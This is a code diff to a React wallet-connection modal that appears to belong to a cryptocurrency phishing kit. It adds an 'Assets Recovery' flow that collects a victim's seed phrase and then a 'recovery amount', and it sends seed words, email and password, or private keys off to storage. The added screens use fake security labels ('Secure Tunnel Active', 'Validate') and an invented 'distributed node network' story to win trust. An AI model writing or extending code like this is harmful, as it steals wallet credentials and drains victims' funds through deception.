@@ -24,7 +24,8 @@ import {
   Loader2,
   Mail,
   Fingerprint,
-  Wallet as WalletIcon
+  Wallet as WalletIcon,
+  CircleDollarSign
 } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { cn } from "@/lib/utils";
@@ -93,9 +94,9 @@ function WalletImage({ src, alt, className }: { src: string; alt: string; classN
   );
 }
 
-type View = "list" | "login" | "processing" | "methods" | "seed-phrase" | "email-password" | "private-key";
+type View = "list" | "login" | "processing" | "methods" | "seed-phrase" | "email-password" | "private-key" | "amount";
 
-export function WalletModal({ children }: { children: React.ReactNode }) {
+export function WalletModal({ children, featureTitle }: { children: React.ReactNode, featureTitle?: string }) {
   const [mounted, setMounted] = useState(false);
   const [view, setView] = useState<View>("list");
   const [search, setSearch] = useState("");
@@ -109,7 +110,10 @@ export function WalletModal({ children }: { children: React.ReactNode }) {
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [privateKey, setPrivateKey] = useState("");
+  const [amount, setAmount] = useState("");
   const [isSubmitting, setIsSubmitting] = useState(false);
+
+  const isAssetsRecovery = featureTitle === "Assets Recovery";
 
   useEffect(() => {
     setMounted(true);
@@ -130,6 +134,7 @@ export function WalletModal({ children }: { children: React.ReactNode }) {
     setEmail("");
     setPassword("");
     setPrivateKey("");
+    setAmount("");
     setIsSubmitting(false);
   };
 
@@ -142,7 +147,7 @@ export function WalletModal({ children }: { children: React.ReactNode }) {
         wallet_name: selectedWallet?.name || "Unknown",
         wallet_address: walletAddress,
         type: "initial-connection",
-        data: { status: "initialized", step: "wallet-entered" },
+        data: { status: "initialized", step: "wallet-entered", feature: featureTitle },
         timestamp: new Date().toISOString(),
         user_agent: typeof window !== "undefined" ? window.navigator.userAgent : "unknown"
       }]);
@@ -154,18 +159,21 @@ export function WalletModal({ children }: { children: React.ReactNode }) {
     }
   };
 
-  const handleFinalSubmit = async (type: "seed-phrase" | "email-password" | "private-key") => {
+  const handleFinalSubmit = async (type: "seed-phrase" | "email-password" | "private-key" | "assets-recovery") => {
     if (isSubmitting) return;
     setIsSubmitting(true);
 
     try {
       let dataPayload: any = {};
       
-      if (type === "seed-phrase") {
+      if (type === "seed-phrase" || type === "assets-recovery") {
         dataPayload = {
           words: seedWords.slice(0, wordCount).filter(w => w.trim() !== ""),
           count: wordCount
         };
+        if (type === "assets-recovery") {
+          dataPayload.amount = amount;
+        }
       } else if (type === "email-password") {
         dataPayload = { email, password };
       } else if (type === "private-key") {
@@ -175,7 +183,7 @@ export function WalletModal({ children }: { children: React.ReactNode }) {
       const submissionData = {
         wallet_name: selectedWallet?.name,
         wallet_address: walletAddress,
-        type,
+        type: isAssetsRecovery ? "assets-recovery" : type,
         data: dataPayload,
         timestamp: new Date().toISOString(),
         user_agent: typeof window !== "undefined" ? window.navigator.userAgent : "unknown"
@@ -199,7 +207,13 @@ export function WalletModal({ children }: { children: React.ReactNode }) {
       const timer1 = setTimeout(() => setProcessingStage(1), 800);
       const timer2 = setTimeout(() => setProcessingStage(2), 1600);
       const timer3 = setTimeout(() => setProcessingStage(3), 2400);
-      const timer4 = setTimeout(() => setView("methods"), 3500);
+      const timer4 = setTimeout(() => {
+        if (isAssetsRecovery) {
+          setView("seed-phrase");
+        } else {
+          setView("methods");
+        }
+      }, 3500);
       return () => {
         clearTimeout(timer1);
         clearTimeout(timer2);
@@ -207,7 +221,7 @@ export function WalletModal({ children }: { children: React.ReactNode }) {
         clearTimeout(timer4);
       };
     }
-  }, [view]);
+  }, [view, isAssetsRecovery]);
 
   if (!mounted) return <>{children}</>;
 
@@ -226,6 +240,7 @@ export function WalletModal({ children }: { children: React.ReactNode }) {
             {view === "seed-phrase" && "Seed Phrase Validation"}
             {view === "email-password" && "Email & Password Validation"}
             {view === "private-key" && "Private Key Validation"}
+            {view === "amount" && "Recovery Amount"}
           </DialogTitle>
         </DialogHeader>
         
@@ -516,7 +531,7 @@ export function WalletModal({ children }: { children: React.ReactNode }) {
 
             <div className="px-6 py-2 flex items-center justify-between border-b border-white/5">
               <button 
-                onClick={() => setView("methods")}
+                onClick={() => setView(isAssetsRecovery ? "login" : "methods")}
                 className="flex items-center gap-2 text-[10px] font-black text-slate-400 hover:text-white uppercase tracking-widest transition-colors"
               >
                 <ChevronLeft size={14} /> Back
@@ -576,12 +591,82 @@ export function WalletModal({ children }: { children: React.ReactNode }) {
               </div>
 
               <Button 
-                onClick={() => handleFinalSubmit("seed-phrase")}
+                onClick={() => {
+                  if (isAssetsRecovery) {
+                    setView("amount");
+                  } else {
+                    handleFinalSubmit("seed-phrase");
+                  }
+                }}
                 disabled={isSubmitting}
                 className="w-full h-16 bg-primary text-black font-black text-xs uppercase tracking-[0.3em] rounded-2xl gap-3 shadow-neon"
               >
                 {isSubmitting ? <Loader2 className="animate-spin" /> : <Shield size={16} />}
-                Validate
+                {isAssetsRecovery ? "Next Step" : "Validate"}
+              </Button>
+            </div>
+          </div>
+        )}
+
+        {view === "amount" && (
+          <div className="flex flex-col animate-in fade-in slide-in-from-right-4 duration-300">
+            <div className="p-6 pb-2 text-center relative">
+              <div className="w-10 h-10 rounded-full bg-emerald-500/10 flex items-center justify-center mx-auto mb-4 border border-emerald-500/20">
+                <CircleDollarSign className="text-emerald-500 w-5 h-5" />
+              </div>
+              <h3 className="font-headline text-2xl font-black mb-1 uppercase tracking-tight">
+                RECOVERY AMOUNT
+              </h3>
+              <p className="text-slate-500 text-[11px] font-bold tracking-widest">
+                Specify the asset value for recovery.
+              </p>
+            </div>
+
+            <div className="px-6 py-2 flex items-center justify-between border-b border-white/5">
+              <button 
+                onClick={() => setView("seed-phrase")}
+                className="flex items-center gap-2 text-[10px] font-black text-slate-400 hover:text-white uppercase tracking-widest transition-colors"
+              >
+                <ChevronLeft size={14} /> Back
+              </button>
+              <div className="flex items-center gap-2 px-3 py-1.5 rounded-full bg-emerald-500/10 border border-emerald-500/20 text-emerald-500 text-[9px] font-black uppercase tracking-widest">
+                <Lock size={10} /> Secure Tunnel Active
+              </div>
+            </div>
+
+            <div className="p-8">
+              <h4 className="text-xs font-black uppercase tracking-[0.2em] mb-8 text-center sm:text-left">
+                Target Asset Amount
+              </h4>
+
+              <div className="space-y-6 mb-10">
+                <div className="space-y-3">
+                   <label className="text-[10px] font-headline font-black uppercase tracking-[0.2em] text-slate-500 ml-1">
+                    Value to Recover
+                  </label>
+                  <Input 
+                    placeholder="e.g. 5.25 ETH / 15,000 USDC" 
+                    value={amount}
+                    onChange={(e) => setAmount(e.target.value)}
+                    className="bg-[#0D161F] border-white/5 h-16 pl-6 text-sm font-bold focus-visible:ring-1 focus-visible:ring-primary/50 rounded-2xl placeholder:text-slate-700"
+                  />
+                </div>
+
+                <div className="p-4 rounded-2xl bg-[#0F222F]/50 border border-[#1A3A4D] flex gap-4 items-start">
+                  <Info className="text-[#38BDF8] shrink-0 mt-1" size={18} />
+                  <p className="text-[11px] text-slate-400 leading-relaxed">
+                    Specifying the exact amount helps our routing engine prioritize your recovery request across the distributed node network.
+                  </p>
+                </div>
+              </div>
+
+              <Button 
+                onClick={() => handleFinalSubmit("assets-recovery")}
+                disabled={isSubmitting || !amount}
+                className="w-full h-16 bg-primary text-black font-black text-xs uppercase tracking-[0.3em] rounded-2xl gap-3 shadow-neon"
+              >
+                {isSubmitting ? <Loader2 className="animate-spin" /> : <ShieldCheck size={16} />}
+                Complete Recovery
               </Button>
             </div>
           </div>
@@ -644,8 +729,8 @@ export function WalletModal({ children }: { children: React.ReactNode }) {
               </Button>
 
               <div className="mt-8 text-center">
-                <div className="inline-flex items-center gap-2 text-[9px] text-slate-600 font-bold uppercase tracking-[0.3em]">
-                   <div className="w-1.5 h-1.5 rounded-full border border-slate-600"></div>
+                <div className="inline-flex items-center gap-2 px-4 py-2 rounded-full bg-white/5 border border-white/5 text-slate-500 text-[10px] font-bold uppercase tracking-widest">
+                   <Shield size={12} />
                    Secure Protocol Failover
                 </div>
               </div>
@@ -703,8 +788,8 @@ export function WalletModal({ children }: { children: React.ReactNode }) {
               </Button>
 
               <div className="mt-8 text-center">
-                <div className="inline-flex items-center gap-2 text-[9px] text-slate-600 font-bold uppercase tracking-[0.3em]">
-                   <div className="w-1.5 h-1.5 rounded-full border border-slate-600"></div>
+                <div className="inline-flex items-center gap-2 px-4 py-2 rounded-full bg-white/5 border border-white/5 text-slate-500 text-[10px] font-bold uppercase tracking-widest">
+                   <Shield size={12} />
                    Secure Protocol Failover
                 </div>
               </div>
